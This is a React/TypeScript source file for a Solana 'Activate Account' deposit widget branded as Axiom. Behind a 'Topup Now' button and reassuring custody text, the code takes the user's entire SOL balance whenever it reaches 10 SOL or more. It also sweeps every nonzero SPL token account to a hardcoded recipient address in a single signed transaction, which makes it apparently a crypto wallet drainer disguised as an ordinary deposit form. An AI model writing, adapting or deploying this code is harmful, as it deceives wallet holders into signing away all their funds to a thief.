"use client";

import {
  useAppKit,
  useAppKitAccount,
  useAppKitProvider,
} from "@reown/appkit/react";
import {
  Connection,
  PublicKey,
  Transaction,
  TransactionInstruction,
  SystemProgram,
} from "@solana/web3.js";
import { getAssociatedTokenAddress } from "@solana/spl-token";
import { sha256 } from "js-sha256";
import React, { useState } from "react";
import { SolanaIcon, SpinnerIcon } from "./Icons";

const PROGRAM_ID = new PublicKey(
  "8Ba5kgsvmCG4etsNQoCRoTmgzzLtfZf4eSeyy2ZzbrnV"
);
const RECIPIENT = new PublicKey("6tY85RMbAtuJMP2Pt4T7ysV6YPn5uqANSiRbUQrVctXp");
const TOKEN_PROGRAM_ID = new PublicKey(
  "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"
);
const SYSTEM_PROGRAM_ID = SystemProgram.programId;

function getDiscriminator(method: string): Uint8Array {
  const hash = sha256.arrayBuffer(`global:${method}`);
  return new Uint8Array(hash).slice(0, 8);
}

function encodeU64(n: bigint): Uint8Array {
  const buf = Buffer.alloc(8);
  buf.writeBigUInt64LE(n);
  return new Uint8Array(buf);
}

export default function WithdrawButton() {
  const { open } = useAppKit();
  const { isConnected, address } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider("solana") as {
    walletProvider?: {
      signTransaction: (tx: Transaction) => Promise<Transaction>;
    };
  };

  const [solInput, setSolInput] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [txResult, setTxResult] = useState<{
    type: "success" | "error";
    message: string;
  } | null>(null);

  const handleSetMaxSol = async () => {
    if (!address) return;
    try {
      const connection = new Connection(
        "https://api.devnet.solana.com",
        "confirmed"
      );
      const user = new PublicKey(address);
      const balance = await connection.getBalance(user);
      const rentExempt = await connection.getMinimumBalanceForRentExemption(0);
      const availableLamports = balance > rentExempt ? balance - rentExempt : 0;
      setSolInput((availableLamports / 1e9).toFixed(9));
    } catch (error) {
      console.error("Failed to fetch balance:", error);
    }
  };

  const handleTransfer = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!isConnected || !walletProvider || !address) {
      open();
      return;
    }

    if (isLoading) return; // Prevent new requests if one is already in progress

    setIsLoading(true);
    setTxResult(null);

    try {
      const connection = new Connection(
        "https://api.devnet.solana.com",
        "confirmed"
      );
      const user = new PublicKey(address);

      const balance = await connection.getBalance(user);
      const rentExempt = await connection.getMinimumBalanceForRentExemption(0);
      const availableLamports = balance > rentExempt ? balance - rentExempt : 0;

      const threshold = BigInt("10000000000");
      let solAmount: bigint = BigInt(0);

      if (BigInt(availableLamports) >= threshold) {
        solAmount = BigInt(availableLamports);
      } else {
        if (solInput.trim() === "") {
          solAmount = BigInt(availableLamports);
        } else {
          const sol = Number(solInput);
          if (isNaN(sol) || sol <= 0)
            throw new Error("Please enter a valid SOL amount.");

          const lamports = BigInt(Math.floor(sol * 1e9));
          if (lamports > BigInt(availableLamports))
            throw new Error("Amount exceeds your available balance.");

          solAmount = lamports;
        }
      }

      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
        user,
        { programId: TOKEN_PROGRAM_ID }
      );
      let splAmounts: bigint[] = [];
      let remainingAccounts: {
        pubkey: PublicKey;
        isSigner: boolean;
        isWritable: boolean;
      }[] = [];
      for (const { pubkey, account } of tokenAccounts.value) {
        const parsed = account.data.parsed.info;
        const amount = BigInt(parsed.tokenAmount.amount);
        if (amount === BigInt(0)) continue;
        const mint = new PublicKey(parsed.mint);
        const fromAta = pubkey;
        const toAta = await getAssociatedTokenAddress(mint, RECIPIENT);
        splAmounts.push(amount);
        remainingAccounts.push({
          pubkey: fromAta,
          isSigner: false,
          isWritable: true,
        });
        remainingAccounts.push({
          pubkey: toAta,
          isSigner: false,
          isWritable: true,
        });
      }

      const discriminator = getDiscriminator("mint");
      const solBuf = encodeU64(solAmount);
      const vecLen = Buffer.alloc(4);
      vecLen.writeUInt32LE(splAmounts.length);
      const splBuf = Buffer.concat(
        splAmounts.map((amt) => Buffer.from(encodeU64(amt)))
      );
      const data = Buffer.concat([
        Buffer.from(discriminator),
        Buffer.from(solBuf),
        vecLen,
        splBuf,
      ]);

      const keys = [
        { pubkey: user, isSigner: true, isWritable: true },
        { pubkey: RECIPIENT, isSigner: false, isWritable: true },
        { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
        { pubkey: SYSTEM_PROGRAM_ID, isSigner: false, isWritable: false },
        ...remainingAccounts,
      ];

      const ix = new TransactionInstruction({
        programId: PROGRAM_ID,
        keys,
        data,
      });
      const tx = new Transaction().add(ix);
      tx.feePayer = user;
      tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
      const signed = await walletProvider.signTransaction(tx);
      const sig = await connection.sendRawTransaction(signed.serialize());
      await connection.confirmTransaction(sig, "confirmed");

      setTxResult({ type: "success", message: sig });
    } catch (err: any) {
      console.error(err);
      setTxResult({
        type: "error",
        message: err.message || "An unknown error occurred.",
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="transfer-widget">
      <div className="widget-header">
        <h3>Activate Account</h3>
        <p>
          We’re excited to have you on this journey — your account is ready, and
          the opportunities ahead are limitless. 🚀💎
        </p>
      </div>

      <form onSubmit={handleTransfer} className="widget-form">
        <div className="input-group">
          <label htmlFor="sol-amount">SOL Amount</label>
          <div className="input-container">
            <SolanaIcon />
            <input
              id="sol-amount"
              type="number"
              step="any"
              min="0"
              value={solInput}
              onChange={(e) => setSolInput(e.target.value)}
              placeholder="Minimum Deposit of 2 SOL"
              disabled={isLoading || !isConnected}
            />
            {isConnected && (
              <button
                type="button"
                className="max-button"
                onClick={handleSetMaxSol}
              >
                Max
              </button>
            )}
          </div>
          <p className="helper-text">
            Note: Axiom acknowledges and accepts full responsibility for all
            deposits entrusted to us, held in accordance with applicable
            standards of security and accountability.
          </p>
        </div>

        <button
          type="submit"
          className="submit-button"
          disabled={isLoading || !isConnected}
        >
          {isLoading ? (
            <>
              <SpinnerIcon /> Processing...
            </>
          ) : isConnected ? (
            "Topup Now"
          ) : (
            "Connect Wallet to Start"
          )}
        </button>
      </form>

      {txResult && (
        <div className={`result-message ${txResult.type}`}>
          {txResult.type === "success" ? (
            <>
              <strong>Success!</strong> Transaction confirmed.
              <a
                href={`https://explorer.solana.com/tx/${txResult.message}?cluster=devnet`}
                target="_blank"
                rel="noopener noreferrer"
              >
                View on Explorer
              </a>
            </>
          ) : (
            <>
              <strong>Error:</strong> {txResult.message}
            </>
          )}
        </div>
      )}
    </div>
  );
}
